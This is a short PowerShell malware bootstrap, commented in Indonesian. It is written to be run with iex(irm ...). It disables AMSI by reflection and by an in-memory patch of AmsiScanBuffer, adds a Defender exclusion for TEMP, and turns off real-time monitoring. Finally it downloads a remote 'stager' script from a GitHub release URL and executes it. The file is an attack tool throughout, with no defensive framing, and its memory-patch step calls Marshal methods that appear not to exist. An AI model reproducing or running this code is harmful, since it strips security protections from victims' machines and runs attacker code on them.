# b.ps1 - bootstrap: matikan AMSI + exclusion, BARU ambil st.ps1
# Dipanggil: iex(irm .../b.ps1)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# 1. AMSI mati sebelum ada konten lain yang dipindai
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $t.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
} catch { }
try {
    $k = [Runtime.InteropServices.Marshal]
    $p = $k::GetProcAddress($k::GetModuleHandle('amsi.dll'), 'AmsiScanBuffer')
    $k::Copy([byte[]](0xB8, 0x57, 0, 7, 0x80, 0xC3), 0, $p, 6)
} catch { }

# 2. exclusion + redam real-time (butuh admin; kalau gagal, lanjut)
try { Add-MpPreference -ExclusionPath $env:TEMP -Force } catch { }
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch { }

# 3. baru muat stager sungguhan
iex((New-Object Net.WebClient).DownloadString('https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/st.ps1'))
